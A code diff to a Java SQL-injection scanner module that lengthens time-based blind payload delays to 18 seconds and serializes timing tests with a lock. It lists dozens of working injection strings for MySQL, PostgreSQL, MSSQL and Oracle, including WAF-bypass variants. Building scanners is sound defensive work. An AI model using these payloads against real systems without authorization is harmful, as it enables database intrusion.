@@ -9,6 +9,7 @@ import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
 import com.omnistrike.framework.PayloadEncoder;
+import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
 
@@ -229,95 +230,95 @@ public class SmartSqliDetector implements ScanModule {
         Map<String, String[]> tp = new LinkedHashMap<>();
         tp.put("MySQL", new String[]{
                 // Basic SLEEP
-                "' OR SLEEP(5)-- -", "1' AND SLEEP(5)-- -", "\" OR SLEEP(5)-- -",
-                "1 AND SLEEP(5)-- -", "' OR SLEEP(5)#",
+                "' OR SLEEP(18)-- -", "1' AND SLEEP(18)-- -", "\" OR SLEEP(18)-- -",
+                "1 AND SLEEP(18)-- -", "' OR SLEEP(18)#",
                 // Comment-as-space bypass
-                "'/**/OR/**/SLEEP(5)#",
-                "1'/**/AND/**/SLEEP(5)-- -",
+                "'/**/OR/**/SLEEP(18)#",
+                "1'/**/AND/**/SLEEP(18)-- -",
                 // Conditional SLEEP with IF
-                "' AND IF(1=1,SLEEP(5),0)-- -",
-                "' AND IF(1=1,SLEEP(5),0)#",
-                "1' AND IF(1=1,SLEEP(5),0)-- -",
-                "\" AND IF(1=1,SLEEP(5),0)-- -",
-                "1 AND IF(1=1,SLEEP(5),0)-- -",
+                "' AND IF(1=1,SLEEP(18),0)-- -",
+                "' AND IF(1=1,SLEEP(18),0)#",
+                "1' AND IF(1=1,SLEEP(18),0)-- -",
+                "\" AND IF(1=1,SLEEP(18),0)-- -",
+                "1 AND IF(1=1,SLEEP(18),0)-- -",
                 // Conditional SLEEP with CASE
-                "' AND (CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)-- -",
-                "1' AND (CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END)-- -",
+                "' AND (CASE WHEN 1=1 THEN SLEEP(18) ELSE 0 END)-- -",
+                "1' AND (CASE WHEN 1=1 THEN SLEEP(18) ELSE 0 END)-- -",
                 // Subquery wrapper (WAF bypass)
-                "' AND (SELECT SLEEP(5))-- -",
-                "1' AND (SELECT SLEEP(5))-- -",
-                "' AND (SELECT * FROM (SELECT SLEEP(5))a)-- -",
-                "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
+                "' AND (SELECT SLEEP(18))-- -",
+                "1' AND (SELECT SLEEP(18))-- -",
+                "' AND (SELECT * FROM (SELECT SLEEP(18))a)-- -",
+                "1' AND (SELECT * FROM (SELECT(SLEEP(18)))a)-- -",
                 // BENCHMARK alternative (when SLEEP is disabled)
                 "' AND BENCHMARK(10000000,SHA1('test'))-- -",
                 "1' AND BENCHMARK(10000000,SHA1('test'))-- -",
                 "' AND BENCHMARK(5000000,MD5('test'))-- -",
                 // SLEEP in UNION
-                "' UNION SELECT SLEEP(5)-- -",
-                "' UNION SELECT SLEEP(5),NULL-- -",
+                "' UNION SELECT SLEEP(18)-- -",
+                "' UNION SELECT SLEEP(18),NULL-- -",
                 // Parenthetical grouping
-                "') OR SLEEP(5)-- -",
-                "')) OR SLEEP(5)-- -",
-                "') AND SLEEP(5)-- -",
+                "') OR SLEEP(18)-- -",
+                "')) OR SLEEP(18)-- -",
+                "') AND SLEEP(18)-- -",
                 // Inline comment bypass
-                "'/*!50000AND*/SLEEP(5)-- -",
-                "'/*!SLEEP(5)*/-- -",
+                "'/*!50000AND*/SLEEP(18)-- -",
+                "'/*!SLEEP(18)*/-- -",
                 // Newline bypass
-                "'%0aOR%0aSLEEP(5)-- -",
+                "'%0aOR%0aSLEEP(18)-- -",
                 // ELT/MAKE_SET based (alternative delay)
-                "' AND ELT(1=1,SLEEP(5))-- -",
+                "' AND ELT(1=1,SLEEP(18))-- -",
                 // Stacked query with SLEEP
-                "'; SELECT SLEEP(5)-- -",
-                "1'; SELECT SLEEP(5)-- -",
+                "'; SELECT SLEEP(18)-- -",
+                "1'; SELECT SLEEP(18)-- -",
         });
         tp.put("PostgreSQL", new String[]{
                 // Basic PG_SLEEP
-                "'; SELECT PG_SLEEP(5)-- -", "1'; SELECT PG_SLEEP(5)-- -",
-                "' || (SELECT PG_SLEEP(5))-- -",
+                "'; SELECT PG_SLEEP(18)-- -", "1'; SELECT PG_SLEEP(18)-- -",
+                "' || (SELECT PG_SLEEP(18))-- -",
                 // Comment-as-space bypass
-                "';/**/SELECT/**/PG_SLEEP(5)-- -",
+                "';/**/SELECT/**/PG_SLEEP(18)-- -",
                 // Conditional PG_SLEEP with CASE
-                "' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(5)) END) IS NOT NULL-- -",
-                "1' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(5)) END) IS NOT NULL-- -",
-                "' AND CASE WHEN 1=1 THEN CAST((SELECT PG_SLEEP(5)) AS text) ELSE '0' END='0'-- -",
+                "' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(18)) END) IS NOT NULL-- -",
+                "1' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(18)) END) IS NOT NULL-- -",
+                "' AND CASE WHEN 1=1 THEN CAST((SELECT PG_SLEEP(18)) AS text) ELSE '0' END='0'-- -",
                 // Subquery wrapper
-                "' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
-                "1' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
-                "' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",
+                "' AND (SELECT PG_SLEEP(18)) IS NOT NULL-- -",
+                "1' AND (SELECT PG_SLEEP(18)) IS NOT NULL-- -",
+                "' AND 1=(SELECT 1 FROM PG_SLEEP(18))-- -",
                 // Stacked query variants
-                "\"; SELECT PG_SLEEP(5)-- -",
-                "1; SELECT PG_SLEEP(5)-- -",
+                "\"; SELECT PG_SLEEP(18)-- -",
+                "1; SELECT PG_SLEEP(18)-- -",
                 // generate_series based delay
                 "'; SELECT COUNT(*) FROM generate_series(1,10000000)-- -",
                 // Parenthetical grouping
-                "'); SELECT PG_SLEEP(5)-- -",
-                "')); SELECT PG_SLEEP(5)-- -",
+                "'); SELECT PG_SLEEP(18)-- -",
+                "')); SELECT PG_SLEEP(18)-- -",
                 // PG_SLEEP in WHERE
-                "' AND PG_SLEEP(5)::text='1'-- -",
+                "' AND PG_SLEEP(18)::text='1'-- -",
         });
         tp.put("MSSQL", new String[]{
                 // Basic WAITFOR DELAY
-                "'; WAITFOR DELAY '0:0:5'-- -", "1'; WAITFOR DELAY '0:0:5'-- -",
-                "' WAITFOR DELAY '0:0:5'-- -",
+                "'; WAITFOR DELAY '0:0:18'-- -", "1'; WAITFOR DELAY '0:0:18'-- -",
+                "' WAITFOR DELAY '0:0:18'-- -",
                 // Comment-as-space bypass
-                "';/**/WAITFOR/**/DELAY/**/'0:0:5'-- -",
+                "';/**/WAITFOR/**/DELAY/**/'0:0:18'-- -",
                 // Double quote variant
-                "\"; WAITFOR DELAY '0:0:5'-- -",
+                "\"; WAITFOR DELAY '0:0:18'-- -",
                 // No-quote (integer injection)
-                "1; WAITFOR DELAY '0:0:5'-- -",
+                "1; WAITFOR DELAY '0:0:18'-- -",
                 // Conditional WAITFOR with IF
-                "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
-                "1'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
-                "'; IF 1=1 WAITFOR DELAY '0:0:5'-- -",
+                "'; IF(1=1) WAITFOR DELAY '0:0:18'-- -",
+                "1'; IF(1=1) WAITFOR DELAY '0:0:18'-- -",
+                "'; IF 1=1 WAITFOR DELAY '0:0:18'-- -",
                 // Conditional with CASE
-                "'; DECLARE @d VARCHAR(10);SET @d=CASE WHEN 1=1 THEN '0:0:5' ELSE '0:0:0' END;WAITFOR DELAY @d-- -",
+                "'; DECLARE @d VARCHAR(10);SET @d=CASE WHEN 1=1 THEN '0:0:18' ELSE '0:0:0' END;WAITFOR DELAY @d-- -",
                 // Stacked query variants
-                "1; WAITFOR DELAY '0:0:5'-- -",
+                "1; WAITFOR DELAY '0:0:18'-- -",
                 // Parenthetical grouping
-                "'); WAITFOR DELAY '0:0:5'-- -",
-                "')); WAITFOR DELAY '0:0:5'-- -",
+                "'); WAITFOR DELAY '0:0:18'-- -",
+                "')); WAITFOR DELAY '0:0:18'-- -",
                 // WAITFOR TIME (wait until a time, less common but works)
-                "'; WAITFOR DELAY '00:00:05'-- -",
+                "'; WAITFOR DELAY '00:00:18'-- -",
                 // Heavy query alternative (no WAITFOR needed)
                 "' AND (SELECT COUNT(*) FROM sysusers AS a CROSS JOIN sysusers AS b CROSS JOIN sysusers AS c)>0-- -",
         });
@@ -333,20 +334,20 @@ public class SmartSqliDetector implements ScanModule {
         });
         tp.put("Oracle", new String[]{
                 // DBMS_PIPE.RECEIVE_MESSAGE
-                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
-                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
-                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
+                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
+                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
                 // Conditional with CASE
-                "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=1-- -",
+                "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',18) ELSE 0 END=1-- -",
                 // DBMS_LOCK.SLEEP (requires DBA privilege)
-                "'; BEGIN DBMS_LOCK.SLEEP(5); END;-- -",
-                "1'; BEGIN DBMS_LOCK.SLEEP(5); END;-- -",
+                "'; BEGIN DBMS_LOCK.SLEEP(18); END;-- -",
+                "1'; BEGIN DBMS_LOCK.SLEEP(18); END;-- -",
                 // UTL_INADDR heavy DNS lookup
                 "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1')-- -",
                 // Heavy query (cross join)
                 "' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<=10000000)-- -",
                 // DBMS_SESSION.SLEEP (12c+)
-                "'; BEGIN DBMS_SESSION.SLEEP(5); END;-- -",
+                "'; BEGIN DBMS_SESSION.SLEEP(18); END;-- -",
                 // httpuritype timeout
                 "' AND 1=HTTPURITYPE('http://10.255.255.1/').GETCLOB()-- -",
         });
@@ -734,14 +735,9 @@ public class SmartSqliDetector implements ScanModule {
                 testErrorBased(original, ip, baselineBody);
             }
 
-            // Phase 3: Union-based (if enabled)
+            // Phase 4: Union-based (if enabled)
             if (config.getBool("sqli.union.enabled", true)) {
                 testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody);
-            }
-
-            // Phase 4: Time-based blind (if enabled)
-            if (config.getBool("sqli.time.enabled", true)) {
-                testTimeBased(original, ip, baselineTime);
             }
 
             // Phase 5: Boolean-based blind (if enabled)
@@ -752,6 +748,19 @@ public class SmartSqliDetector implements ScanModule {
             // Phase 6: OOB via Collaborator (if enabled and available)
             if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
                 testOob(original, ip);
+            }
+
+            // Phase 7: Time-based blind (LAST — serialized via TimingLock)
+            if (config.getBool("sqli.time.enabled", true)) {
+                try {
+                    TimingLock.acquire();
+                    testTimeBased(original, ip, baselineTime);
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    return;
+                } finally {
+                    TimingLock.release();
+                }
             }
 
         } catch (Exception e) {
@@ -1282,7 +1291,7 @@ public class SmartSqliDetector implements ScanModule {
     // ==================== PHASE 4: TIME-BASED BLIND ====================
 
     private void testTimeBased(HttpRequestResponse original, InjectionPoint ip, long baselineTime) {
-        int delayThreshold = config.getInt("sqli.time.threshold", 4000);
+        int delayThreshold = config.getInt("sqli.time.threshold", 14400);
 
         // Step 0: Collect 3 baseline measurements and check stability
         long[] baselines = new long[3];
@@ -1316,7 +1325,7 @@ public class SmartSqliDetector implements ScanModule {
                     TimedResult result1 = measureResponseTime(original, ip, payload);
 
                     if (result1.elapsedMs >= baselineMax + delayThreshold) {
-                        // Step 2: Build false-condition payload (replace SLEEP(5) → IF(1=2,SLEEP(5),0) etc.)
+                        // Step 2: Build false-condition payload (replace SLEEP(18) → IF(1=2,SLEEP(18),0) etc.)
                         String falsePayload = buildFalseConditionPayload(payload, dbType);
 
                         if (falsePayload != null) {
@@ -1386,21 +1395,21 @@ public class SmartSqliDetector implements ScanModule {
 
     /**
      * Build a false-condition version of a time-based payload.
-     * E.g., SLEEP(5) → IF(1=2,SLEEP(5),0), PG_SLEEP(5) → CASE WHEN 1=2 THEN PG_SLEEP(5) END
+     * E.g., SLEEP(18) → IF(1=2,SLEEP(18),0), PG_SLEEP(18) → CASE WHEN 1=2 THEN PG_SLEEP(18) END
      */
     private String buildFalseConditionPayload(String truePayload, String dbType) {
         // Try to convert common patterns to false conditions
-        if (truePayload.contains("SLEEP(5)") && !truePayload.contains("IF(")) {
-            return truePayload.replace("SLEEP(5)", "IF(1=2,SLEEP(5),0)");
+        if (truePayload.contains("SLEEP(18)") && !truePayload.contains("IF(")) {
+            return truePayload.replace("SLEEP(18)", "IF(1=2,SLEEP(18),0)");
         }
-        if (truePayload.contains("IF(1=1,SLEEP(5)")) {
-            return truePayload.replace("IF(1=1,SLEEP(5)", "IF(1=2,SLEEP(5)");
+        if (truePayload.contains("IF(1=1,SLEEP(18)")) {
+            return truePayload.replace("IF(1=1,SLEEP(18)", "IF(1=2,SLEEP(18)");
         }
-        if (truePayload.contains("WHEN 1=1 THEN SLEEP(5)")) {
-            return truePayload.replace("WHEN 1=1 THEN SLEEP(5)", "WHEN 1=2 THEN SLEEP(5)");
+        if (truePayload.contains("WHEN 1=1 THEN SLEEP(18)")) {
+            return truePayload.replace("WHEN 1=1 THEN SLEEP(18)", "WHEN 1=2 THEN SLEEP(18)");
         }
-        if (truePayload.contains("PG_SLEEP(5)") && !truePayload.contains("CASE")) {
-            return truePayload.replace("PG_SLEEP(5)", "CASE WHEN 1=2 THEN PG_SLEEP(5) END");
+        if (truePayload.contains("PG_SLEEP(18)") && !truePayload.contains("CASE")) {
+            return truePayload.replace("PG_SLEEP(18)", "CASE WHEN 1=2 THEN PG_SLEEP(18) END");
         }
         if (truePayload.contains("WHEN 1=1 THEN") && truePayload.contains("PG_SLEEP")) {
             return truePayload.replace("WHEN 1=1 THEN", "WHEN 1=2 THEN");
